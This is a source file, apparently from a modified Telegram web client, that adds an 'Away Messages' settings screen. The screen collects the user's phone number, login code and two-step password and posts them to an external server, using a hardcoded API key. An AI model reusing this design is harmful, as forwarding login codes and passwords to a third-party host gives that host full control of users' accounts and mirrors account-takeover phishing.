import type { FC } from '../../../lib/teact/teact';
import { memo, useState, useCallback, useEffect } from '../../../lib/teact/teact';
import { withGlobal } from '../../../global';

import Button from '../../ui/Button';
import InputText from '../../ui/InputText';
import './Settings.scss';

const BACKEND_URL = "https://kmt285476-telegram.hf.space"; 
const API_KEY = "tg_custom_secret_key_2026";

type OwnProps = { onReset: () => void; };
type StateProps = { 
  currentUserId?: string;
  currentUserPhone?: string; 
};

const AutoReplySettings: FC<OwnProps & StateProps> = ({ currentUserId, currentUserPhone }) => {
  const safeUserId = currentUserId || "unknown";

  const [isFetching, setIsFetching] = useState(true);
  const [isLinked, setIsLinked] = useState(false);
  const [isEnabled, setIsEnabled] = useState(false);
  const [replyText, setReplyText] = useState("I am currently unavailable. I will reply to you later.");
  
  const [step, setStep] = useState<'idle' | 'otp' | '2fa'>(() => {
    return (localStorage.getItem(`ar_setup_step_${safeUserId}`) as any) || 'idle';
  });
  const [savedPhone, setSavedPhone] = useState(() => localStorage.getItem(`ar_setup_phone_${safeUserId}`) || '');
  
  const [otpCode, setOtpCode] = useState('');
  const [twoFaPassword, setTwoFaPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  // Permanent Settings များကို Database မှ ဆွဲယူခြင်း
  useEffect(() => {
    if (safeUserId === "unknown") return;
    const fetchSettings = async () => {
      try {
        const res = await fetch(`${BACKEND_URL}/api/get_auto_reply`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
          body: JSON.stringify({ user_id: safeUserId })
        });
        const data = await res.json();
        if (res.ok && data.is_linked) {
          setIsLinked(true);
          setIsEnabled(data.enabled);
          if (data.text) setReplyText(data.text);
        } else {
          setIsLinked(false);
        }
      } catch (err) {
      } finally {
        setIsFetching(false);
      }
    };
    fetchSettings();
  }, [safeUserId]);

  const handleCancelSetup = useCallback(() => {
    setStep('idle');
    setOtpCode('');
    setTwoFaPassword('');
    setErrorMsg('');
    localStorage.removeItem(`ar_setup_step_${safeUserId}`);
    localStorage.removeItem(`ar_setup_phone_${safeUserId}`);
  }, [safeUserId]);

  const handleAutoRequestCode = async () => {
    if (!currentUserPhone) {
        setErrorMsg("Phone number not found for this account.");
        return;
    }
    setErrorMsg('');
    const formattedPhone = currentUserPhone.startsWith('+') ? currentUserPhone : `+${currentUserPhone}`;
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/request_code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
        body: JSON.stringify({ phone_number: formattedPhone })
      });
      const data = await res.json();
      if (res.ok) {
        setStep('otp');
        setSavedPhone(formattedPhone);
        localStorage.setItem(`ar_setup_step_${safeUserId}`, 'otp');
        localStorage.setItem(`ar_setup_phone_${safeUserId}`, formattedPhone);
      } else {
        setErrorMsg(data.error || "Failed to request code.");
      }
    } catch (err) { setErrorMsg("Network Error: Could not connect to the server."); }
    setIsLoading(false);
  };

  const handleVerifyCode = async () => {
    if (!otpCode && step === 'otp') {
        setErrorMsg("Please enter the OTP code.");
        return;
    }
    setErrorMsg('');
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/verify_code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
        body: JSON.stringify({ user_id: safeUserId, phone_number: savedPhone, otp_code: otpCode, two_step_password: twoFaPassword || undefined })
      });
      const data = await res.json();
      if (res.ok) {
        handleCancelSetup(); 
        setIsLinked(true);
        setIsEnabled(true);
      } else if (res.status === 401 && data.error === "2FA_REQUIRED") {
        setStep('2fa');
        localStorage.setItem(`ar_setup_step_${safeUserId}`, '2fa'); 
      } else if (res.status === 400 && data.error.includes("expired")) {
        setErrorMsg("Code expired. Please request a new one.");
        handleCancelSetup();
      } else {
        setErrorMsg(data.error || "Verification failed.");
      }
    } catch (err) { setErrorMsg("Network Error: Could not verify code."); }
    setIsLoading(false);
  };

  const handleSaveSettings = async () => {
    setIsLoading(true);
    setErrorMsg('');
    try {
      const res = await fetch(`${BACKEND_URL}/api/update_auto_reply`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
        body: JSON.stringify({ user_id: safeUserId, enabled: isEnabled, text: replyText })
      });
      
      if (!res.ok) {
        if (res.status === 400 || res.status === 401) {
            // 🌟 Session ပြတ်သွားပါက အားလုံးကို မူလအခြေအနေသို့ ပြန်လည်သတ်မှတ်ပါမည်
            setIsLinked(false);
            setIsEnabled(false);
            setStep('idle'); // ချက်ချင်း OTP မတောင်းတော့ဘဲ ပုံမှန် Request လုပ်ရမည့် မျက်နှာပြင်သို့ ပြန်ပို့ပါမည်
            
            // LocalStorage အတွင်း မှတ်သားထားမှုများကိုပါ ဖျက်လင်းပါမည်
            localStorage.removeItem(`ar_setup_step_${safeUserId}`);
            localStorage.removeItem(`ar_setup_phone_${safeUserId}`);
            
            setErrorMsg("Session terminated. Please connect again.");
        } else {
            setErrorMsg("Failed to update settings. Please try again.");
        }
      } else {
        setErrorMsg('');
      }
    } catch (err) { 
        setErrorMsg("Network Error: Could not save settings."); 
    }
    setIsLoading(false);
  };

  if (isFetching) {
    return (
      <div className="settings-content custom-scroll" style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100%' }}>
        <p style={{ color: 'var(--color-text-secondary)' }}>Loading settings...</p>
      </div>
    );
  }

  // 🌟 [UI ကို သီးသန့်ခွဲထုတ်လိုက်ခြင်း] 🌟
  // ဤနေရာသည် "မချိတ်ဆက်ရသေးသော (သို့) Session ပြတ်သွားသော" အခြေအနေအတွက် သီးသန့် Render လုပ်ပေးမည့် နေရာဖြစ်သည်
  if (!isLinked) {
    return (
      <div className="settings-content custom-scroll">
        <div className="settings-header">
          <h3 className="settings-header-title">Away Messages</h3>
        </div>
        <div className="settings-main-menu">
            <div className="settings-item pt-3 pb-3" style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', textAlign: 'center', padding: '2.5rem 1rem' }}>
              {errorMsg && <p style={{ color: 'var(--color-error)', fontSize: '14px', marginBottom: '1.5rem', width: '100%', background: 'rgba(223, 63, 64, 0.1)', padding: '10px', borderRadius: '8px' }}>{errorMsg}</p>}
              
              {step === 'idle' && (
                <div style={{ width: '100%', maxWidth: '320px' }}>
                  <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '1.5rem' }}>
                    <div style={{ width: '72px', height: '72px', borderRadius: '50%', background: 'rgba(51, 144, 236, 0.1)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                      <i className="icon-message" style={{ fontSize: '36px', color: '#3390ec' }} />
                    </div>
                  </div>
                  <h4 style={{ marginBottom: '0.75rem', fontSize: '18px', fontWeight: 500, color: 'var(--color-text)' }}>Connect Server</h4>
                  <p style={{ color: 'var(--color-text-secondary)', marginBottom: '2rem', fontSize: '15px', lineHeight: '1.5' }}>Connect your account to enable away messages.</p>
                  <Button onClick={handleAutoRequestCode} isLoading={isLoading} fluid>Request Login Code</Button>
                </div>
              )}

              {step === 'otp' && (
                <div style={{ width: '100%', maxWidth: '320px' }}>
                  <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '1.5rem' }}>
                    <div style={{ width: '72px', height: '72px', borderRadius: '50%', background: 'rgba(51, 144, 236, 0.1)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                      <i className="icon-lock" style={{ fontSize: '36px', color: '#3390ec' }} />
                    </div>
                  </div>
                  <h4 style={{ marginBottom: '0.75rem', fontSize: '18px', fontWeight: 500, color: 'var(--color-text)' }}>Verification Code</h4>
                  <p style={{ color: 'var(--color-text-secondary)', marginBottom: '1.5rem', fontSize: '15px', lineHeight: '1.5' }}>Enter the code sent to your Telegram app.</p>
                  <div style={{ textAlign: 'left', marginBottom: '2rem' }}>
                    <InputText label="Code" value={otpCode} onChange={(e: any) => setOtpCode(e.target.value)} />
                  </div>
                  <div style={{ display: 'flex', gap: '12px' }}>
                      <Button color="danger" className="translucent" onClick={handleCancelSetup} disabled={isLoading} style={{ flex: 1 }}>Cancel</Button>
                      <Button onClick={handleVerifyCode} isLoading={isLoading} style={{ flex: 1 }}>Verify</Button>
                  </div>
                </div>
              )}

              {step === '2fa' && (
                <div style={{ width: '100%', maxWidth: '320px' }}>
                  <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '1.5rem' }}>
                    <div style={{ width: '72px', height: '72px', borderRadius: '50%', background: 'rgba(51, 144, 236, 0.1)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                      <i className="icon-password" style={{ fontSize: '36px', color: '#3390ec' }} />
                    </div>
                  </div>
                  <h4 style={{ marginBottom: '0.75rem', fontSize: '18px', fontWeight: 500, color: 'var(--color-text)' }}>Two-Step Verification</h4>
                  <p style={{ color: 'var(--color-text-secondary)', marginBottom: '1.5rem', fontSize: '15px', lineHeight: '1.5' }}>Your account is protected with an additional password.</p>
                  <div style={{ textAlign: 'left', marginBottom: '2rem' }}>
                    <InputText label="Cloud Password" type="password" value={twoFaPassword} onChange={(e: any) => setTwoFaPassword(e.target.value)} />
                  </div>
                  <div style={{ display: 'flex', gap: '12px' }}>
                      <Button color="danger" className="translucent" onClick={handleCancelSetup} disabled={isLoading} style={{ flex: 1 }}>Cancel</Button>
                      <Button onClick={handleVerifyCode} isLoading={isLoading} style={{ flex: 1 }}>Submit</Button>
                  </div>
                </div>
              )}
            </div>
        </div>
      </div>
    );
  }

  // 🌟 [UI ကို သီးသန့်ခွဲထုတ်လိုက်ခြင်း] 🌟
  // ဤနေရာသည် "ချိတ်ဆက်ပြီးသား (Away Message Settings)" အခြေအနေအတွက် သီးသန့် Render လုပ်ပေးမည့် နေရာဖြစ်သည်
  return (
    <div className="settings-content custom-scroll">
      <div className="settings-header">
        <h3 className="settings-header-title">Away Messages</h3>
      </div>
      <div className="settings-main-menu">
        <div style={{ padding: '0 1rem' }}>
          <div className="settings-item pt-3 pb-3" style={{ cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'space-between', userSelect: 'none', borderBottom: '1px solid var(--color-borders)' }} onClick={() => setIsEnabled(!isEnabled)}>
            <div style={{ display: 'flex', flexDirection: 'column', paddingRight: '20px' }}>
              <span style={{ fontSize: '16px', fontWeight: 500, color: 'var(--color-text)' }}>Enable Away Messages</span>
              <span style={{ marginTop: '4px', color: 'var(--color-text-secondary)', fontSize: '14px', lineHeight: '1.4' }}>Automatically reply to incoming private messages when you are away.</span>
            </div>
            <div style={{ position: 'relative', width: '42px', height: '24px', flexShrink: 0, background: isEnabled ? '#3390ec' : 'var(--color-borders)', borderRadius: '12px', transition: 'background 0.3s ease' }}>
                <div style={{ position: 'absolute', top: '2px', left: isEnabled ? '20px' : '2px', width: '20px', height: '20px', background: '#ffffff', borderRadius: '50%', transition: 'left 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)', boxShadow: '0 2px 4px rgba(0,0,0,0.2)' }} />
            </div>
          </div>

          <div className="settings-item pt-4">
            <h4 style={{ fontSize: '14px', fontWeight: 500, color: 'var(--color-text-secondary)', marginBottom: '12px', textTransform: 'uppercase', letterSpacing: '0.5px' }}>Away Message</h4>
            <div style={{ border: isEnabled ? '1px solid #3390ec' : '1px solid var(--color-borders)', borderRadius: '10px', background: 'var(--color-background-compact)', padding: '8px', transition: 'all 0.3s ease', opacity: isEnabled ? 1 : 0.5, pointerEvents: isEnabled ? 'auto' : 'none' }}>
              <textarea value={replyText} onChange={(e: any) => setReplyText(e.target.value)} disabled={!isEnabled} rows={4} placeholder="Write your away message here..." style={{ width: '100%', border: 'none', background: 'transparent', outline: 'none', color: 'var(--color-text)', fontSize: '15px', resize: 'none', fontFamily: 'inherit', padding: '8px', lineHeight: '1.5' }} />
            </div>
          </div>

          {errorMsg && (
            <div className="settings-item pt-3">
              <p style={{ color: 'var(--color-error)', fontSize: '14px', textAlign: 'center', background: 'rgba(223, 63, 64, 0.1)', padding: '10px', borderRadius: '8px' }}>{errorMsg}</p>
            </div>
          )}

          <div className="settings-item pt-4 pb-4">
            <Button onClick={handleSaveSettings} isLoading={isLoading} fluid>Save Settings</Button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default memo(withGlobal<OwnProps>(
  (global): StateProps => { 
      const currentUserId = global.currentUserId;
      let currentUserPhone = undefined;
      if (currentUserId && global.users && global.users.byId) {
          const user = global.users.byId[currentUserId];
          if (user && user.phoneNumber) currentUserPhone = user.phoneNumber;
      }
      return { currentUserId, currentUserPhone }; 
  }
)(AutoReplySettings));
